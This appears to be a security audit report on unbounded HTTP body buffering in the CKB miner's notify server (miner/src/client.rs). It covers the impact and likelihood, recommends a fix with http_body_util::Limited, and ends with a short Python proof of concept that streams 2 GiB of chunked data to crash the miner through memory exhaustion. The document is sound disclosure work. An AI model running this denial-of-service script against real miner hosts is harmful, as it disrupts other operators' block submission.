Audit Report

## Title
Unbounded HTTP request body buffering in miner notify server leads to OOM — (`miner/src/client.rs`)

## Summary
The `handle()` function in `miner/src/client.rs` collects the full incoming HTTP request body into memory with no size limit via `BodyExt::collect(req).await?.aggregate()`. Any TCP client that can reach the configured notify listen address can exhaust the miner process's heap memory, causing an OOM crash and halting block submission from that miner instance.

## Finding Description
At line 362 of `miner/src/client.rs`, the `handle()` function calls `BodyExt::collect(req).await?.aggregate()` directly on `hyper::body::Incoming` with no size cap. The import at line 14 confirms `http_body_util::Limited` is not imported and not used anywhere in the file. The notify listener is spawned unconditionally whenever `config.listen` is `Some(addr)` (line 206), which is a documented, supported production feature with explicit operator guidance in the log messages at lines 207–221. No authentication, token, or connection guard is applied before body collection begins. Every byte the sender streams is buffered into a contiguous `Buf` before `serde_json::from_reader` is called, meaning the allocation occurs entirely before any application-level logic can reject the request.

## Impact Explanation
Crashing the miner process (`ckb miner`) via OOM constitutes a **local command line crash** (Note, 0–500 points). The miner is a separate process from the CKB node (`ckb run`); crashing it does not crash the CKB network, does not affect other nodes or miners, does not cause consensus deviation, and does not damage the CKB economy. The impact is limited to halting block submission from the targeted miner instance.

## Likelihood Explanation
The notify listen address defaults to loopback (`127.0.0.1`) in typical deployments. Any unprivileged local user account on the same host can open a TCP connection to a loopback port without elevated privileges. If the operator binds to `0.0.0.0`, any LAN peer qualifies. No authentication is required. The attack is a single HTTP request with a large chunked body. The feature must be explicitly enabled via `config.listen`, but it is a documented production feature, not an unsupported configuration.

## Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MiB

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

`Limited` returns `Err` once the threshold is exceeded, aborting the connection without buffering the full payload.

## Proof of Concept
```python
import socket

HOST, PORT = "127.0.0.1", <configured_notify_port>
s = socket.create_connection((HOST, PORT))
header = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: application/json\r\n\r\n"
).encode()
s.sendall(header)
chunk = b"A" * (1024 * 1024)
hex_len = f"{len(chunk):x}\r\n".encode()
for _ in range(2048):  # 2 GiB total
    s.sendall(hex_len + chunk + b"\r\n")
# Observe miner process OOM-killed
```

Run with `config.listen` set to a local port. Monitor miner process RSS; it grows proportionally to bytes sent until OOM kill.